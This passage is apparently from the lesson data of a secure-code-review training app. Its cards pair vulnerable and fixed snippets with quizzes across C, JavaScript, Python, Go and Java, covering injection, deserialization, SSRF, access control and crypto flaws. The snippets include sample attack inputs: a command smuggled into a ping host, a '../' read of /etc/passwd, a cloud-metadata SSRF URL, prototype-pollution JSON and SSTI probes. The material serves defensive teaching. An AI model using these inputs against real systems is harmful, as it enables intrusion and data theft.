     {t:'md',html:'<p>Functions in the <code class="inl">printf</code> family read a <b>format string</b> with placeholders (<code class="inl">%s</code>, <code class="inl">%x</code>, <code class="inl">%n</code>). If <b>user input becomes the format string</b> itself, the attacker controls those placeholders — leaking memory with <code class="inl">%x</code>/<code class="inl">%s</code>, or even writing to memory with <code class="inl">%n</code>.</p>'},
     {t:'read',lang:'cpp',label:'Vulnerable vs safe',code:'printf(user_input);          // BUG: input IS the format string\nprintf("%s", user_input);    // safe: input is just data',note:'If <code class="inl">user_input</code> is <code class="inl">"%x %x %x"</code> the first line dumps stack memory; <code class="inl">%n</code> can write to it. The fix is to always pass a fixed format string and put user data in an argument.'},
     {t:'quiz',q:'What makes <code class="inl">printf(user_input)</code> a vulnerability?',
      opts:['printf is deprecated','User input is used as the format string, so %x/%n let the attacker read or write memory','It prints too slowly','It needs a trailing newline'],a:1,
      why:'When attacker input is the <b>format string</b>, placeholders like <code class="inl">%x</code> (read the stack) and <code class="inl">%n</code> (write) execute. Always use a literal format: <code class="inl">printf("%s", input)</code>.'}
   ]}
  ]
 },
 {
  id:'web', name:'JS & Web Logic', tag:'WEB', icon:'JS', accent:'violet',
  sub:'Client and server JavaScript, plus the logic flaws scanners miss.',
  lessons:[
   {id:'j1', name:'DOM XSS & dangerous sinks', xp:30, cards:[
     {t:'md',html:'<p>In browser JS, some properties/functions treat strings as HTML or code. Feed them untrusted data and you get DOM-based XSS. Dangerous sinks:</p><p><code class="inl">innerHTML</code>, <code class="inl">outerHTML</code>, <code class="inl">document.write</code>, <code class="inl">eval</code>, <code class="inl">setTimeout("string")</code>, <code class="inl">location</code>. Common sources: <code class="inl">location.hash</code>, <code class="inl">location.search</code>, <code class="inl">document.referrer</code>.</p>'},
     {t:'read',lang:'js',code:'const q = location.hash.slice(1);       // source: URL fragment\ndocument.getElementById("out").innerHTML = q;  // sink: parsed as HTML',note:'<code class="inl">textContent</code> would render it as plain text safely. <code class="inl">innerHTML</code> parses tags and event handlers — that is the bug.'},
     {t:'quiz',q:'Which assignment is the XSS sink here?',
      opts:['location.hash.slice(1)','.innerHTML = q','getElementById("out")','const q'],a:1,
      why:'<b>innerHTML</b> parses its string as HTML. Assigning untrusted data to it lets injected markup and scripts run. <code class="inl">textContent</code> is the safe sibling.'}
   ]},
   {id:'j2', name:'eval, prototype & Node sinks', xp:35, cards:[
     {t:'md',html:'<p>Server-side (Node.js) JavaScript adds OS-level sinks: <code class="inl">child_process.exec()</code>, <code class="inl">eval()</code>, <code class="inl">Function()</code>, and unsafe <code class="inl">fs</code> paths. And <code class="inl">exec</code> (unlike <code class="inl">execFile</code>) runs a full shell.</p>'},
     {t:'read',lang:'js',label:'Vulnerable',code:'const { exec } = require("child_process");\napp.get("/dns", (req,res) => {\n  exec("nslookup " + req.query.domain);   // shell injection\n});',note:'<code class="inl">exec</code> spawns <code class="inl">/bin/sh -c</code>, so shell metacharacters in <code class="inl">req.query.domain</code> run commands. <code class="inl">execFile("nslookup",[domain])</code> avoids the shell.'},
     {t:'quiz',q:'Why is <code class="inl">child_process.exec(userInput)</code> riskier than <code class="inl">execFile("cmd",[userInput])</code>?',
      opts:['exec is deprecated','exec runs input through a shell, so metacharacters chain commands; execFile passes args directly','execFile is faster','No difference'],a:1,
      why:'<b>exec</b> interprets the string in a shell, exposing <code class="inl">; | &amp;&amp; $()</code>. <b>execFile</b>/<b>spawn</b> pass arguments as a list to the binary, with no shell to abuse.'}
   ]},
   {id:'j3', name:'Prototype pollution', xp:35, cards:[
     {t:'md',html:'<p>In JavaScript every object inherits from <code class="inl">Object.prototype</code>. If code copies attacker-controlled keys into an object — a deep <b>merge</b> of JSON, or <code class="inl">obj[key] = value</code> with <code class="inl">key</code> from input — an attacker can set <code class="inl">__proto__</code> (or <code class="inl">constructor.prototype</code>) and change properties on <b>every</b> object at once. Impact ranges from logic bypass and denial of service to, in some stacks, RCE.</p>'},
     {t:'read',lang:'js',label:'Vulnerable deep merge',code:'function merge(target, src) {\n  for (const k in src) {\n    if (typeof src[k] === "object") merge(target[k] = target[k] || {}, src[k]);\n    else target[k] = src[k];        // no guard when k === "__proto__"\n  }\n}\nmerge({}, JSON.parse(req.body));     // {"__proto__":{"isAdmin":true}} pollutes all objects',note:'The merge never rejects <code class="inl">__proto__</code>, so attacker JSON writes onto the shared prototype. Guard the keys (skip <code class="inl">__proto__</code>, <code class="inl">constructor</code>, <code class="inl">prototype</code>) or use a null-prototype object / Map.'},
     {t:'quiz',q:'What makes a recursive object <code class="inl">merge()</code> vulnerable to prototype pollution?',
      opts:['It is recursive','It copies a key like <code class="inl">__proto__</code> from attacker input onto objects, changing the shared prototype','It uses JSON','It runs on Node'],a:1,
      why:'Copying attacker-controlled keys such as <code class="inl">__proto__</code> writes onto <code class="inl">Object.prototype</code>, affecting all objects. Reject those keys or use a Map / null-prototype object.'}
   ]}
  ]
 },
 {
  id:'python', name:'Python', tag:'BACKEND', icon:'py', accent:'violet',
  sub:'Web backends, scripts and automation. Clean syntax, sharp edges.',
  lessons:[
   {id:'py1', name:'Reading Python & where input enters', xp:25, cards:[
     {t:'md',html:'<p>Python has no <code class="inl">$</code> sigils and no type declarations — a variable is just a name being assigned, and <b>indentation</b> (not braces) defines blocks. So you spot untrusted input by the library that produced it.</p><p>Common sources:</p><p>• Flask: <code class="inl">request.args</code>, <code class="inl">request.form</code>, <code class="inl">request.json</code><br>• Django: <code class="inl">request.GET</code>, <code class="inl">request.POST</code><br>• Scripts &amp; CLI: <code class="inl">sys.argv</code>, <code class="inl">input()</code>, environment variables</p>'},
     {t:'read',lang:'python',label:'Flask — a request handler',code:'from flask import request\n\n@app.route("/hello")\ndef hello():\n    name = request.args.get("name")     # SOURCE: from ?name=\n    return "<h1>Hi " + name + "</h1>"    # SINK: reflected into HTML',note:'Input from <code class="inl">request.args</code> is concatenated into HTML and returned — reflected <b>XSS</b> unless escaped. Jinja templates auto-escape; raw string building like this does not.'},
     {t:'quiz',q:'In this Python web handler, which line is the untrusted <b>source</b>?',
      opts:['The <code class="inl">@app.route</code> decorator','<code class="inl">request.args.get("name")</code>','The string <code class="inl">"Hi "</code>','The function name <code class="inl">hello</code>'],a:1,
      why:'<b>request.args</b> reads the URL query string — fully attacker-controlled. The decorator and function name are structure, not data.'}
   ]},
   {id:'py2', name:'SQL injection in Python', xp:30, cards:[
     {t:'md',html:'<p>Every Python database driver (sqlite3, psycopg2, MySQLdb, SQLAlchemy Core) accepts <b>parameters</b>. The bug appears when code builds the query string itself with an <b>f-string</b>, <code class="inl">%</code>, <code class="inl">.format()</code>, or <code class="inl">+</code>.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("name")\ncur.execute(f"SELECT * FROM users WHERE name = \'{name}\'")',note:'The f-string drops <code class="inl">name</code> straight into the SQL text — <code class="inl">?name=\' OR \'1\'=\'1</code> returns every row. f-strings and <code class="inl">.format()</code> are SQL injection in disguise.'},
     {t:'read',lang:'python',label:'Safe — parameterized',code:'cur.execute("SELECT * FROM users WHERE name = %s", (name,))',note:'The <code class="inl">%s</code> here is a <b>driver placeholder</b>, not string formatting — the value is bound separately and can never alter the query. (sqlite3 uses <code class="inl">?</code>.)'},
     {t:'quiz',q:'Which call is <b>safe</b> from SQL injection?',
      opts:['<code class="inl">cur.execute(f"...WHERE id={uid}")</code>','<code class="inl">cur.execute("...WHERE id=%s", (uid,))</code>','<code class="inl">cur.execute("...WHERE id=" + uid)</code>','<code class="inl">cur.execute("...WHERE id={}".format(uid))</code>'],a:1,
      why:'Only the <b>parameterized</b> call keeps the value as data. f-strings, <code class="inl">+</code>, and <code class="inl">.format()</code> all build the query from raw input.'}
   ]},
   {id:'py3', name:'Command injection in Python', xp:30, cards:[
     {t:'md',html:'<p>Python reaches the OS shell through <code class="inl">os.system()</code>, <code class="inl">os.popen()</code>, and <code class="inl">subprocess</code> calls with <code class="inl">shell=True</code>. The danger sign is a <b>built command string</b> handed to any of these.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'import subprocess\nhost = request.args.get("host")\nsubprocess.run("ping -c1 " + host, shell=True)   # ?host=8.8.8.8;id',note:'<code class="inl">shell=True</code> runs the string in <code class="inl">/bin/sh</code>, so <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$()</code> chain attacker commands.'},
     {t:'read',lang:'python',label:'Safe — argument list',code:'subprocess.run(["ping", "-c1", host])   # list form, no shell',note:'An <b>argument list</b> with no <code class="inl">shell=True</code> sends <code class="inl">host</code> as a single argument to ping — the shell never parses it.'},
     {t:'quiz',q:'What single detail makes <code class="inl">subprocess.run(cmd, shell=True)</code> dangerous?',
      opts:['It imports subprocess','<code class="inl">shell=True</code> runs the built string through a shell that interprets metacharacters','run() is deprecated','It returns output'],a:1,
      why:'<b>shell=True</b> plus a concatenated string is command injection. The list form with no shell is the safe pattern.'}
   ]},
   {id:'py4', name:'Server-Side Template Injection', xp:35, cards:[
     {t:'md',html:'<p>Template engines (Jinja2, Twig, Freemarker) evaluate expressions inside markers like <code class="inl">{{ }}</code>. If <b>user input is placed into the template itself</b> — not just passed as a value — the input is evaluated as template code, often leading to RCE. The Python tell is <code class="inl">render_template_string()</code> built from input.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'from flask import render_template_string, request\nname = request.args.get("name")\ntpl = "<h1>Hello " + name + "</h1>"\nreturn render_template_string(tpl)   # ?name={{7*7}} -> 49',note:'Because <code class="inl">name</code> is concatenated into the <i>template source</i>, <code class="inl">{{7*7}}</code> renders as <code class="inl">49</code> — proof of <b>SSTI</b>. Payloads escalate to reading files and running commands.'},
     {t:'read',lang:'python',label:'Safe — fixed template, bound value',code:'return render_template_string("<h1>Hello {{ name }}</h1>", name=name)',note:'The template is <b>fixed</b> and <code class="inl">name</code> is passed as a bound variable — escaped, never evaluated as template code.'},
     {t:'quiz',q:'In a Flask app, <code class="inl">?name={{7*7}}</code> shows <code class="inl">49</code> on the page. What does that prove?',
      opts:['A math bug','Server-Side Template Injection — input is evaluated as template code','A caching issue','Nothing, that is normal'],a:1,
      why:'User input being <b>evaluated</b> (7*7 → 49) means it reached the template engine as code. That is <b>SSTI</b>, a common path to RCE.'}
   ]},
   {id:'py5', name:'Insecure deserialization (pickle)', xp:35, cards:[
     {t:'md',html:'<p>Python\'s <code class="inl">pickle</code> can serialize almost any object — and <b>deserializing</b> attacker-controlled pickle data can execute code, because a pickle stream can invoke arbitrary constructors. The same risk applies to <code class="inl">yaml.load()</code> with an unsafe loader.</p>'},
     {t:'read',lang:'python',label:'Dangerous',code:'import pickle\ndata = request.get_data()          # untrusted bytes\nobj = pickle.loads(data)           # RCE: pickle can run code on load',note:'Never <code class="inl">pickle.loads()</code> untrusted input — a crafted pickle can run commands as your app. Use JSON, or <code class="inl">yaml.safe_load()</code> for YAML.'},
     {t:'quiz',q:'You see <code class="inl">pickle.loads(request.get_data())</code>. Verdict?',
      opts:['Fine — pickle is just serialization','Critical — deserializing untrusted pickle can execute code (RCE)','Only a problem if the object is large','Safe if wrapped in try/except'],a:1,
      why:'<b>pickle.loads</b> on attacker data is a textbook RCE. The fix is a safe format (JSON) or <code class="inl">yaml.safe_load</code>; try/except does not help.'}
   ]}
  ]
 },
 {
  id:'go', name:'Go', tag:'BACKEND', icon:'Go', accent:'amber',
  sub:'Google\'s compiled language for servers and cloud. Clean syntax, familiar bug classes.',
  lessons:[
   {id:'go1', name:'Reading Go & where input enters', xp:25, cards:[
     {t:'md',html:'<p><b>Go</b> is statically typed and compiled, with a clean syntax: <code class="inl">:=</code> declares and infers a variable, and errors are returned explicitly. In web services (<code class="inl">net/http</code>, Gin, Echo) untrusted input arrives via <code class="inl">r.URL.Query().Get()</code>, <code class="inl">r.FormValue()</code>, <code class="inl">r.Header.Get()</code>, and path variables.</p>'},
     {t:'read',lang:'go',label:'net/http handler',code:'func handler(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get("name")     // source: ?name=\n    fmt.Fprintf(w, "<h1>%s</h1>", name)   // reflected into HTML\n}',note:'Go\'s <code class="inl">html/template</code> auto-escapes, but writing straight to the response with <code class="inl">Fprintf</code> does not — reflected <b>XSS</b>. <code class="inl">:=</code> declares and infers the variable type.'},
     {t:'quiz',q:'Where does <code class="inl">r.URL.Query().Get("name")</code> get its value?',
      opts:['A constant','The HTTP request query string — untrusted input','Another Go file','The compiler'],a:1,
      why:'It reads the URL query string from the request. Like all request data it is attacker-controlled and must be treated as a source.'}
   ]},
   {id:'go2', name:'SQL injection in Go', xp:30, cards:[
     {t:'md',html:'<p>Go\'s <code class="inl">database/sql</code> supports <b>placeholders</b> (<code class="inl">?</code> for MySQL, <code class="inl">$1</code> for Postgres). Building the query string with <code class="inl">fmt.Sprintf</code> instead is injectable.</p>'},
     {t:'read',lang:'go',label:'Vulnerable',code:'q := fmt.Sprintf("SELECT * FROM users WHERE name = \'%s\'", name)\nrows, _ := db.Query(q)   // SQL injection',note:'<code class="inl">fmt.Sprintf</code> welds input into the SQL text, exactly like concatenation in other languages.'},
     {t:'read',lang:'go',label:'Safe — placeholder',code:'rows, _ := db.Query("SELECT * FROM users WHERE name = ?", name)  // bound',note:'The <code class="inl">?</code> placeholder keeps <code class="inl">name</code> as data. This is the fix you look for.'},
     {t:'quiz',q:'Which Go database call is safe from SQL injection?',
      opts:['<code class="inl">db.Query(fmt.Sprintf("... %s", name))</code>','<code class="inl">db.Query("... = ?", name)</code> with a placeholder','Concatenating with +','Running it twice'],a:1,
      why:'A parameterized query with a <b>placeholder</b> (<code class="inl">?</code> / <code class="inl">$1</code>) separates code from data. <code class="inl">fmt.Sprintf</code> into the query is the injectable pattern.'}
   ]},
   {id:'go3', name:'Command injection in Go', xp:30, cards:[
     {t:'md',html:'<p>Go runs OS commands with <code class="inl">os/exec</code>. <code class="inl">exec.Command("sh", "-c", str)</code> runs a <b>shell</b> and is injectable; <code class="inl">exec.Command("ping", "-c1", host)</code> passes arguments directly with no shell.</p>'},
     {t:'read',lang:'go',label:'Vulnerable vs safe',code:'// vulnerable: a shell parses the built string\nexec.Command("sh", "-c", "ping -c1 "+host).Run()\n\n// safe: arguments passed directly, no shell\nexec.Command("ping", "-c1", host).Run()',note:'Routing through <code class="inl">sh -c</code> exposes <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$( )</code>. The argument-list form sends <code class="inl">host</code> as a single argument to the binary.'},
     {t:'quiz',q:'What makes <code class="inl">exec.Command("sh","-c", "ping "+host)</code> injectable?',
      opts:['Using Go','User input is concatenated into a command run through a shell','ping is missing','It returns an error'],a:1,
      why:'A concatenated string run via <code class="inl">sh -c</code> lets shell metacharacters chain commands. Pass an argument list with no shell instead.'}
   ]},
   {id:'go4', name:'SSRF & path traversal in Go', xp:30, cards:[
     {t:'md',html:'<p>Two more familiar classes in Go: <b>SSRF</b> — <code class="inl">http.Get(userURL)</code> fetches an attacker-chosen URL (including cloud metadata) — and <b>path traversal</b> — joining a user filename onto a base path and opening it lets <code class="inl">../</code> escape.</p>'},
     {t:'read',lang:'go',label:'Two sinks',code:'resp, _ := http.Get(r.URL.Query().Get("url"))   // SSRF\n\np := filepath.Join("/data", r.URL.Query().Get("f"))\nf, _ := os.Open(p)                                // path traversal via ../',note:'<code class="inl">filepath.Join</code> does not stop <code class="inl">../</code> escaping the base — call <code class="inl">filepath.Clean</code> and verify the result stays inside <code class="inl">/data</code>. Allowlist URLs and block internal ranges for the fetch.'},
     {t:'quiz',q:'Why is <code class="inl">http.Get(userURL)</code> in a server risky?',
      opts:['It is slow','SSRF — the server can reach internal systems (like cloud metadata) the user cannot','It uses too much memory','Nothing'],a:1,
      why:'Fetching a user-supplied URL server-side is <b>SSRF</b>: it abuses the server\'s network position to reach internal-only resources such as the cloud metadata endpoint.'}
   ]}
  ]
 },
 {
  id:'java', name:'Java & the JVM', tag:'JVM', icon:'☕', accent:'violet',
  sub:'Enterprise backends and Android — strong typing, classic injection and deserialization bugs.',
  lessons:[
   {id:'jv1', name:'Reading Java & where input enters', xp:25, cards:[
     {t:'md',html:'<p>Java is statically typed and object-oriented; every method lives in a class. In web apps (Spring, Jakarta EE) untrusted input arrives through:</p><p>• Spring: <code class="inl">@RequestParam</code>, <code class="inl">@PathVariable</code>, <code class="inl">@RequestBody</code><br>• Servlets: <code class="inl">request.getParameter()</code>, <code class="inl">getHeader()</code><br>• CLI: the <code class="inl">String[] args</code> of <code class="inl">main</code></p>'},
     {t:'read',lang:'java',label:'Spring controller',code:'@GetMapping("/user")\npublic String user(@RequestParam String name) {   // bound from ?name=\n    return "<h1>" + name + "</h1>";                 // reflected into HTML\n}',note:'<code class="inl">@RequestParam</code> auto-binds the query parameter into <code class="inl">name</code>. Returned straight into HTML, it is reflected <b>XSS</b> unless the view escapes it.'},
     {t:'quiz',q:'In a Spring controller, where does a <code class="inl">@RequestParam String name</code> value come from?',
      opts:['A constant in the code','The HTTP request (query string, form, etc.) — untrusted input','Another class','The database only'],a:1,
      why:'<b>@RequestParam</b> binds request data into the argument. Like all request-bound values it is attacker-controlled and must be treated as a source.'}
   ]},
   {id:'jv2', name:'SQL injection in JDBC', xp:30, cards:[
     {t:'md',html:'<p>JDBC runs SQL through <code class="inl">Statement</code> or <code class="inl">PreparedStatement</code>. Building a query by <b>concatenation</b> and running it via <code class="inl">Statement</code> is injectable; <code class="inl">PreparedStatement</code> with <code class="inl">?</code> placeholders is safe.</p>'},
     {t:'read',lang:'java',label:'Vulnerable',code:'String sql = "SELECT * FROM users WHERE name = \'" + name + "\'";\nStatement st = conn.createStatement();\nResultSet rs = st.executeQuery(sql);   // SQL injection',note:'Input is welded into the SQL text. An ORM like Hibernate/JPA is injectable too if you build HQL/JPQL by concatenation.'},
     {t:'read',lang:'java',label:'Safe — PreparedStatement',code:'PreparedStatement ps = conn.prepareStatement(\n    "SELECT * FROM users WHERE name = ?");\nps.setString(1, name);   // bound as data\nResultSet rs = ps.executeQuery();',note:'The <code class="inl">?</code> placeholder keeps input as a value, never code. This is the fix you look for.'},
     {t:'quiz',q:'Which JDBC pattern prevents SQL injection?',
      opts:['Statement with a concatenated query','PreparedStatement with ? placeholders and setString()','Running the query twice','Catching SQLException'],a:1,
      why:'<b>PreparedStatement</b> with bound parameters separates code from data. Concatenating into a <code class="inl">Statement</code> is the classic injectable pattern.'}
   ]},
   {id:'jv3', name:'Command injection in Java', xp:30, cards:[
     {t:'md',html:'<p>Java runs OS commands via <code class="inl">Runtime.getRuntime().exec()</code> and <code class="inl">ProcessBuilder</code>. Passing a <b>single built string</b> — especially through a shell (<code class="inl">sh -c</code>) — lets attacker metacharacters chain commands.</p>'},
     {t:'read',lang:'java',label:'Vulnerable',code:'String cmd = "ping -c1 " + host;\nRuntime.getRuntime().exec(new String[]{"sh","-c", cmd});   // shell = injectable',note:'Routing through <code class="inl">sh -c</code> with a concatenated string exposes <code class="inl">;</code> <code class="inl">|</code> <code class="inl">$( )</code>. Prefer <code class="inl">new ProcessBuilder("ping","-c1",host)</code> with no shell and validated args.'},
     {t:'quiz',q:'What makes the exec() call above injectable?',
      opts:['Using Java at all','User input is concatenated into a command run through a shell (sh -c)','ping is not installed','exec() returns a Process'],a:1,
      why:'A concatenated string run via <code class="inl">sh -c</code> lets shell metacharacters chain commands. Pass an argument array with no shell instead.'}
   ]},
   {id:'jv4', name:'Insecure deserialization in Java', xp:35, cards:[
     {t:'md',html:'<p>Java can turn bytes back into objects with <code class="inl">ObjectInputStream.readObject()</code>. On <b>attacker-controlled</b> bytes this is dangerous: crafted data can trigger "gadget chains" in libraries already on the classpath and reach <b>remote code execution</b> (the technique behind tools like ysoserial).</p>'},
     {t:'read',lang:'java',label:'Dangerous',code:'ObjectInputStream in = new ObjectInputStream(request.getInputStream());\nMyObject obj = (MyObject) in.readObject();   // untrusted bytes -> objects',note:'<code class="inl">readObject()</code> on untrusted input is a well-known RCE path. Prefer a safe data format (JSON with a strict schema) and never deserialize untrusted Java objects.'},
     {t:'quiz',q:'Why is <code class="inl">ObjectInputStream.readObject()</code> on request data a critical finding?',
      opts:['It is slow','Crafted bytes can trigger gadget chains and reach remote code execution','It only reads strings','It needs a database'],a:1,
      why:'Java deserialization of attacker data can chain existing classes into <b>RCE</b>. It is the same class of bug behind many Java CVEs.'}
   ]}
  ]
 },
 {
  id:'webpat', name:'Web Attack Patterns', tag:'CROSS-LANG', icon:'◎', accent:'amber',
  sub:'Language-agnostic bug classes scanners and beginners miss.',
  lessons:[
   {id:'w1', name:'SSRF — Server-Side Request Forgery', xp:35, cards:[
     {t:'md',html:'<p><b>Server-Side Request Forgery (SSRF)</b>: the server fetches a URL the user controls. An attacker points it at <b>internal</b> systems the server can reach but they cannot — admin panels, databases, or the cloud <b>metadata endpoint</b> <code class="inl">169.254.169.254</code>, which can hand back credentials.</p><p>The tell: a request function (<code class="inl">requests.get</code>, <code class="inl">fetch</code>, <code class="inl">curl</code>, <code class="inl">file_get_contents</code>) fed a user-supplied URL.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'url = request.args.get("url")     # user controls the whole URL\nr = requests.get(url)             # server fetches it\nreturn r.text                     # ...and returns the response',note:'<code class="inl">?url=http://169.254.169.254/latest/meta-data/</code> makes the server read cloud metadata. Defenses: allowlist hosts, block internal IP ranges, disable redirects.'},
     {t:'quiz',q:'Why is fetching a user-supplied URL server-side dangerous, even though the user could visit URLs themselves?',
      opts:['It is slow','The server can reach internal-only systems (metadata, admin panels) the user cannot','It wastes bandwidth','It is not dangerous'],a:1,
      why:'SSRF abuses the <b>server\'s</b> network position to reach internal resources — the classic prize is cloud <b>metadata</b> credentials.'}
   ]},
   {id:'w2', name:'IDOR & broken access control', xp:35, cards:[
     {t:'md',html:'<p><b>Insecure Direct Object Reference (IDOR)</b>: code looks up a record by an id from the request but never checks that the record <b>belongs to</b> the current user. Change the id, read someone else\'s data.</p><p>This is invisible to input-sanitization thinking — the input is a perfectly valid number. You find it by asking: <i>where is the ownership check?</i></p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'@app.route("/invoice/<id>")\ndef invoice(id):\n    inv = db.invoices.get(id)      # fetched by id from the URL\n    return render(inv)             # no check that inv.owner == current_user',note:'<code class="inl">/invoice/1001</code> → <code class="inl">/invoice/1002</code> exposes another customer\'s invoice. The fix is an <b>authorization check</b>: confirm the object belongs to the caller.'},
     {t:'quiz',q:'A handler loads <code class="inl">invoice[id]</code> straight from the URL id. What control is missing?',
      opts:['Input validation on the number','An authorization check that the invoice belongs to the current user','Rate limiting','HTTPS'],a:1,
      why:'The id is valid data; the flaw is <b>broken access control</b>. Every object fetched by a client-supplied id needs an ownership/permission check.'}
   ]},
   {id:'w3', name:'Path traversal & file inclusion', xp:30, cards:[
     {t:'md',html:'<p><b>Path traversal</b>: a filename from the user is joined to a path and used to read, write, or include files. Sequences like <code class="inl">../</code> climb out of the intended directory to reach <code class="inl">/etc/passwd</code>, source, or config.</p><p>Cross-language sinks: <code class="inl">open()</code>, <code class="inl">readFile</code>, <code class="inl">include</code>, <code class="inl">File.ReadAllText</code>, <code class="inl">fopen</code>.</p>'},
     {t:'read',lang:'python',label:'Vulnerable',code:'name = request.args.get("file")\npath = "/var/www/uploads/" + name\nreturn open(path).read()          # ?file=../../../../etc/passwd',note:'Concatenating a user filename lets <code class="inl">../</code> escape the folder. Defenses: reject <code class="inl">..</code>, resolve the real path and confirm it stays inside the base directory.'},
     {t:'quiz',q:'Which payload characterizes a path-traversal attempt against <code class="inl">/uploads/ + filename</code>?',
      opts:['A very long filename','<code class="inl">../../</code> sequences that climb out of the uploads directory','An uppercase filename','A filename with spaces'],a:1,
      why:'<b>../</b> walks up the directory tree. If the joined path is used without confining it to the base directory, it is path traversal.'}
   ]},
   {id:'w4', name:'Authentication & token flaws', xp:35, cards:[
     {t:'md',html:'<p>Auth bugs you can spot by reading:</p><p>• <b>Predictable tokens</b> — session ids or password resets from <code class="inl">Math.random()</code>, timestamps, or sequential ids.<br>• <b>JWT</b> accepting <code class="inl">alg: none</code>, or a hardcoded/weak secret.<br>• <b>Missing verification</b> — decoding a token but never checking its signature.</p>'},
     {t:'read',lang:'js',label:'Vulnerable — decode is not verify',code:'const token = req.headers.authorization;\nconst data = jwt.decode(token);   // decode != verify — no signature check!\nreq.user = data.user;             // attacker forges {user:"admin"}',note:'<code class="inl">jwt.decode</code> only parses the token; it does not check the signature. Use <code class="inl">jwt.verify(token, secret)</code> so a forged token is rejected.'},
     {t:'quiz',q:'What is wrong with using <code class="inl">jwt.decode(token)</code> for auth instead of <code class="inl">jwt.verify</code>?',
      opts:['Nothing','<code class="inl">decode</code> does not check the signature, so a forged token is trusted','decode is slower','decode needs a database'],a:1,
      why:'<b>decode</b> just parses the token; only <b>verify</b> checks the signature against your secret. Trusting decoded claims lets anyone forge an admin token.'}
   ]},
   {id:'w5', name:'Cross-Site Request Forgery (CSRF)', xp:30, cards:[
     {t:'md',html:'<p><b>CSRF</b> abuses the fact that browsers automatically attach a site\'s cookies to every request to it. If a state-changing action (change email, transfer funds) is authorized by the session cookie <i>alone</i>, an attacker page can submit that request on the victim\'s behalf — no credential theft needed.</p><p>The tell: a POST that changes state with <b>no anti-CSRF token</b> and no <code class="inl">SameSite</code> cookie protection.</p>'},
     {t:'read',lang:'js',label:'Vulnerable vs defended',code:'// vulnerable: the state change trusts the session cookie only\napp.post("/account/email", (req, res) => {\n  updateEmail(req.session.user, req.body.email);\n});\n\n// defended: require an unpredictable CSRF token (+ SameSite cookies)\napp.post("/account/email", csrfProtection, handler);',note:'Defences: a per-session <b>CSRF token</b> the attacker cannot know, <code class="inl">SameSite=Lax/Strict</code> cookies, and checking the origin/referer for sensitive actions.'},
     {t:'quiz',q:'Why can an attacker page trigger a state-changing request as the victim in a CSRF bug?',
      opts:['It steals the password','The browser auto-sends the victim\'s session cookie, and the action requires nothing else','It reads the database','It disables HTTPS'],a:1,
      why:'Browsers attach the site\'s cookies to requests automatically. If a sensitive action is authorized by the cookie alone, a cross-site request rides it. Require an anti-CSRF token and SameSite cookies.'}
   ]},
   {id:'w6', name:'Open redirect', xp:25, cards:[
     {t:'md',html:'<p>An <b>open redirect</b> is a redirect whose destination comes from user input with no validation. Because the link starts on the trusted domain, it is convincing in phishing: the victim clicks a link to <code class="inl">trusted.com</code> and lands on the attacker\'s site.</p><p>The tell: <code class="inl">redirect(userInput)</code> where the target is a full, attacker-controlled URL.</p>'},
     {t:'read',lang:'js',label:'Vulnerable vs safe',code:'// vulnerable: ?next=https://evil.example bounces the user off-site\nres.redirect(req.query.next);\n\n// safe: accept only known, relative paths\nconst next = req.query.next || "/";\nif (!next.startsWith("/") || next.startsWith("//")) return res.redirect("/");\nres.redirect(next);',note:'Allowlist redirect targets or accept only relative paths (and reject <code class="inl">//host</code>, which browsers treat as protocol-relative). Never redirect to a raw user-supplied URL.'},
     {t:'quiz',q:'Why is <code class="inl">res.redirect(req.query.next)</code> dangerous?',
      opts:['Redirects are always unsafe','An attacker controls the destination, so a link on the trusted site can send victims to a phishing page','It is slow','It breaks cookies'],a:1,
      why:'An unvalidated redirect target lets an attacker craft a trusted-looking link that bounces victims to a malicious site. Allowlist targets or accept only relative paths.'}
   ]},
   {id:'w7', name:'CORS misconfiguration', xp:30, cards:[
     {t:'md',html:'<p><b>CORS</b> decides which other origins may <i>read</i> a cross-origin response. A dangerous misconfiguration reflects the request\'s <code class="inl">Origin</code> header back in <code class="inl">Access-Control-Allow-Origin</code> <b>and</b> sets <code class="inl">Access-Control-Allow-Credentials: true</code> — now <b>any</b> website can make authenticated requests as the victim and read the response. Trusting the <code class="inl">null</code> origin or a broad wildcard is similarly risky.</p>'},
     {t:'read',lang:'js',label:'Vulnerable vs safe',code:'// vulnerable: reflect whatever Origin the request claims + allow credentials\nres.setHeader("Access-Control-Allow-Origin", req.headers.origin);\nres.setHeader("Access-Control-Allow-Credentials", "true");\n\n// safer: allowlist specific trusted origins only\nif (ALLOWED.has(req.headers.origin))\n  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);',note:'Reflecting the <code class="inl">Origin</code> with credentials enabled lets any site read authenticated responses. Allowlist exact origins, and never pair a reflected/wildcard origin with <code class="inl">Allow-Credentials: true</code>.'},
     {t:'quiz',q:'Why is reflecting the request <code class="inl">Origin</code> with <code class="inl">Allow-Credentials: true</code> dangerous?',
      opts:['It is slow','Any website can then send authenticated requests and read the responses, stealing user data','It blocks all requests','It breaks caching'],a:1,
      why:'Echoing the caller\'s origin while allowing credentials trusts <b>every</b> site, so a malicious page can read the victim\'s authenticated data. Allowlist specific origins instead.'}
   ]}
  ]
 },
 {
  id:'crypto', name:'Crypto Failures', tag:'CRYPTO', icon:'🔐', accent:'amber',
  sub:'The cryptography mistakes you can spot by reading — weak hashes, bad randomness, broken ciphers.',
  lessons:[
   {id:'cr1', name:'Password hashing done wrong', xp:30, cards:[
     {t:'md',html:'<p>Passwords must be stored as <b>slow, salted</b> hashes. Fast general-purpose hashes — <code class="inl">MD5</code>, <code class="inl">SHA1</code>, <code class="inl">SHA-256</code> — are built for speed, so an attacker with a leaked database can try billions of guesses per second.</p><p>The right tools are <b>bcrypt</b>, <b>argon2</b>, or <b>PBKDF2</b>: deliberately slow and salted.</p>'},
     {t:'read',lang:'php',label:'Wrong vs right',code:'$hash = md5($password);              // fast, unsalted -> crackable\n$hash = password_hash($password, PASSWORD_DEFAULT);  // bcrypt/argon2',note:'Seeing <code class="inl">md5</code>/<code class="inl">sha1</code> on a password is a finding. <code class="inl">password_hash()</code> (PHP), <code class="inl">bcrypt</code>, and <code class="inl">argon2</code> add cost and a salt automatically.'},
     {t:'quiz',q:'Why is <code class="inl">MD5</code> a poor choice for hashing passwords?',
